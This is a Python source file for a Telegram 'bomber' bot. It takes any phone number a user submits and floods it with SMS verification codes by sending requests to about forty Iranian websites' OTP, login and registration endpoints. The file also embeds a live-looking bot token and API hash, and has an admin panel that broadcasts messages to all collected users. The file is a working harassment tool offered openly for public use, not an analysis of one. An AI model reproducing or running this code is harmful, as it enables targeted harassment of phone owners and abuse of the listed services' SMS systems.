
from telethon import TelegramClient, events,Button
import asyncio
import requests,os,asyncio
from threading import Thread
api_id = 6428667
api_hash = "29d065fcf605189e9e281230e026ff8f"
nml="شما ادمین ربات نیستید"
bc = [
        [Button.inline('⚡️ back ⚡️', 'back')],
    ]

keyboard_admin = [[
        Button.inline('Send Messages Users', data="msg"),
        Button.inline('Forward Messages Users', data="fmsg")],
        [Button.inline('Back Up Users', data="bac"),
        Button.inline('Number Of Users', data="usrs")],
    ]
if not os.path.exists('Users.txt') :
    o = open('Users.txt','w')
    o.write('')
    o.close()
async def NewUser(fi) :
    o = open('Users.txt','r')
    Re = o.read()
    o.close()
    if not str(fi) in str(Re) :
        o = open('Users.txt','a')
        o.write(str(fi) + '\n')
        o.close()
async def GetStatus() :
    o = open('Users.txt','r')
    x = o.read()
    o.close()
    i = 0
    for _ in x.split('\n') :
        i = i + 1
    return str(i)

client = TelegramClient("botbomber" , api_id , api_hash).start(bot_token="5441407216:AAEPzmp4LKAtkumbtXtJWIvs5PaSbY_PFxA")
admin = [1352208092,1352208092,1352208092]
@client.on(events.NewMessage(from_users=admin,pattern=r'/panel'))
async def adminmain(event):
	await event.reply("**🚡 Hi Dear Admin ! Welcome To Panel Admin !**",buttons=keyboard_admin)
	
def sms(number):
    for i in range(3):
	    api = "https://i.devslop.app/app/ifollow/api/otp.php"
	    headers = {
	    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
	    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; M2007J20CG MIUI/V12.0.9.0.QJGMIXM)",
	    "Host": "i.devslop.app",
	    "Connection": "Keep-Alive",
	    "Accept-Encoding": "gzip",
	    "Content-Length": "32"
	  }
	    data = ("number={}&state=number&".format(number))
	    url1 = "https://api.digikala.com/v1/user/authenticate/"
	    number1 = {"username":number}
	    sms1 = requests.post(url1, data=number1)
	    r = requests.post(api, headers=headers, data=data)
    url2 = "https://api.digikala.com/v1/user/authenticate/"
    number2 = {"username":number}
    sms2 = requests.post(url2, data=number2) 
    
    url3 = "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification"
    number3 = {"mobile":number}
    sms3 = requests.post(url3, data=number3)
    
    url4 = "https://hiword.ir/wp-json/otp-login/v1/login"
    number4 = {"identifier":number}
    sms4 = requests.post(url4, data=number4)
    
    url5 = "https://abantether.com/users/register/phone/send/"
    number5 = {"phoneNumber":number}
    sms5 = requests.post(url5, data=number5)
    
    url6 = "https://api.bit24.cash/api/v3/auth/check-mobile"
    number6 = {"mobile":number}
    sms6 = requests.post(url6, data=number6)
    
    url7 = "https://dicardo.com/main/sendsms"
    number7 = {"phone":number}
    sms7 = requests.post(url7, data=number7)
    
    url8 = "https://ghasedak24.com/user/ajax_register"
    number8 = {"username":number}
    sms8 = requests.post(url8, data=number8)
    
    url9 = "https://tikban.com/Account/LoginAndRegister"
    number9 = {"CellPhone":number}
    sms9 = requests.post(url9, data=number9)
    
    url10 = "https://www.digistyle.com/users/login-register/"
    number10 = {"loginRegister[email_phone]":number}
    sms10 = requests.post(url10, data=number10)
    
    url11 = "https://tagmond.com/phone_number"
    number11 = {"phone_number":number}
    sms11 = requests.post(url11, data=number11)

    url12 = "https://banankala.com/home/login"
    number12 = {"Mobile":number}
    sms12 = requests.post(url12, data=number12)
    
    url13 = "https://www.iranketab.ir/account/register"
    number13 = {"UserName":number}
    sms13 = requests.post(url13, data=number13)
    
    url14 = "https://ketabchi.com/api/v1/auth/requestVerificationCode"
    number14 = {"phoneNumber":number}
    sms14 = requests.post(url14, data=number14)
    
    url15 = f"https://join.tapsi.ir/smsConfirm?phoneNumber={number}"
    sms15 = requests.get(url15)
    
    url16 = "https://www.offdecor.com/index.php?route=account/login/sendCode"
    number16 = {"phone":number}
    sms16 = requests.post(url16, data=number16)
    
    url17 = "https://exo.ir/index.php?route=account/mobile_login"
    number17 = {"mobile_number":number}
    sms17 = requests.post(url17, data=number17)
    
    url18 = "https://shahrfarsh.com/Account/Login"
    number18 = {"phoneNumber":number}
    sms18 = requests.post(url18, data=number18)
    
    url19 = "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php"
    number19 = {"phone_email":number}
    sms19 = requests.post(url19, data=number19)
    
    url20 = "https://shop.beheshticarpet.com/my-account/"
    number20 = {"billing_mobile":number}
    sms20 = requests.post(url20, data=number20)
    
    url21 = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={number}"
    sms21 = requests.post(url21)
    
    url22 = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={number}"
    sms22 = requests.get(url22)
    
    url23 = "https://www.khanoumi.com/accounts/sendotp"
    number23 = {"mobile":number}
    sms23 = requests.post(url23, data=number23)
    
    url24 = "https://rojashop.com/api/auth/sendOtp"
    number24 = {"mobile":number}
    sms24 = requests.post(url24, data=number24)
    
    url25 = "https://dadpardaz.com/advice/getLoginConfirmationCode"
    number25 = {"mobile":number}
    sms25 = requests.post(url25, data=number25)
    
    url26 = "https://api.rokla.ir/api/request/otp"
    number26 = {"mobile":number}
    sms26 = requests.post(url26, data=number26)
    
    url27 = "https://khodro45.com/api/v1/customers/otp/"
    number27 = {"mobile":number}
    sms27 = requests.post(url27, data=number27)

    url28 = "https://mashinbank.com/api2/users/check"
    number28 = {"mobileNumber":number}
    sms28 = requests.post(url28, data=number28)

    url29 = "https://api.pezeshket.com/core/v1/auth/requestCode"
    number29 = {"mobileNumber":number}
    sms29 = requests.post(url29, data=number29)

    url30 = "https://api.timcheh.com/auth/otp/send"
    number30 = {"mobile":number}
    sms30 = requests.post(url30, data=number30)

    url31 = "https://mobogift.com/signin"
    number31 = {"username":number}
    sms31 = requests.post(url31, data=number31)

    url32 = "https://api.iranicard.ir/api/v1/register"
    number32 = {"mobile":number}
    sms32 = requests.post(url32, data=number32)
    
    url33 = f"https://pubg-sell.ir/loginuser?username={number}"
    sms33 = requests.get(url33)

    url34 = "https://tj8.ir/auth/register"
    number34 = {"mobile":number}
    sms34 = requests.post(url34, data=number34)

    url35 = "https://www.digistyle.com/users/login-register/"
    number35 = {"loginRegister[email_phone]":number}
    sms35 = requests.post(url35, data=number35)

    url36 = "https://cinematicket.org/api/v1/users/signup"
    number36 = {"phone_number":number}
    sms36 = requests.post(url36, data=number36)

    url37 = "https://www.irantic.com//api/login/request"
    number37 = {"mobile":number}
    sms37 = requests.post(url37, data=number37)

    url38 = "https://kafegheymat.com/shop/getLoginSms"
    number38 = {"phone":number}
    sms38 = requests.post(url38, data=number38)

    url39 = "https://www.delino.com/user/register"
    number39 = {"mobile":number}
    sms39 = requests.post(url39, data=number39)

    url40 = "https://alopeyk.com/api/sms/send.php"
    number40 = {"phone":number}
    sms40 = requests.post(url40, data=number40)
    
    url41 = f"https://filmnet.ir/api-v2/access-token/users/{number}/otp"
    sms41 = requests.post(url41)
    
    url01 = "https://portal.callmee.org/my/callmeeapi.php"
    number01 = {"pnum":number}
    sms01 = requests.post(url01, data=number01)
    
	    
@client.on(events.NewMessage(pattern="/start"))
async def bomber(event):
	user_id = event.sender_id
	await NewUser(user_id)
	chat = await event.get_chat()
	async with client.conversation(chat) as conv:
	   await conv.send_message("""
**♻️ Hi Bro  !
🌱 Please Send Number : 09xxxxxxxx

🧑‍💻 Coder : @LoaTary**
	   """)
	   response = await conv.get_response()
	   if response.raw_text.isdigit():
	   	await client.send_message(event.chat_id,f"""**
	   	⛱ Sending Bomber for Number -> {response.raw_text}
🕔 After the operation is finished, the message will stop !**
        """)
	   	Thread(target=sms, args=[response.raw_text]).start()
	   else:
	   		await client.send_message(event.chat_id,"""
	   		**❗ Number is Wrong !

        ⚠️ Please Enter Number Correctly !**
        """)
	   		
@client.on(events.CallbackQuery(data='usrs'))
async def ids(event):
	x=await event.edit("`wait . . `")
	Id=await GetStatus()
	await x.edit(f"**users:{Id}**",buttons=bc)

@client.on(events.CallbackQuery(data='msg'))
async def for_bot(event):
	await event.delete()
	chat = await event.get_chat()
	async with client.conversation(chat) as conv:
		inp=await conv.send_message('**Send Your Message , For Send To All Users !**')
		response = await conv.get_response()
		pl=await event.reply('`Please Wait . . .`')
		o = open('Users.txt','r')
		x = o.read()
		o.close()
		for _ in x.split('\n') :
			try :
				await client.send_message(int(_),response.raw_text)
			except :
				pass
		await pl.delete()
		await inp.delete()
		await client.send_message(chat,'**Sent To All User !**',buttons=bc)

@client.on(events.CallbackQuery(data='fmsg'))
async def forbot(event):
	await event.delete()
	chat = await event.get_chat()
	async with client.conversation(chat) as conv:
		inp=await conv.send_message('**Send Your Message , For Forward  To All Users !**')
		response = await conv.get_response()
		pl=await event.reply('`Please Wait . . .`')
		o = open('Users.txt','r')
		x = o.read()
		o.close()
		for _ in x.split('\n') :
			try :
				await response.forward_to(int(_))
			except :
				pass
		await pl.delete()
		await inp.delete()
		await client.send_message(chat,'**Sent To All User !**',buttons=bc)
		
@client.on(events.CallbackQuery(data='back'))
async def back_handler(event):
	await event.edit("**🚡 Hi Dear Admin ! Welcome To Panel Admin !**",buttons=keyboard_admin)

@client.on(events.CallbackQuery(data='bac'))
async def backup(event):
	d=await event.edit("`wait . . `")
	await client.send_message(event.chat_id,file="Users.txt")
	await d.edit(f"👇",buttons=bc)

print("started")	   			   		
client.start()
client.run_until_disconnected()
	   		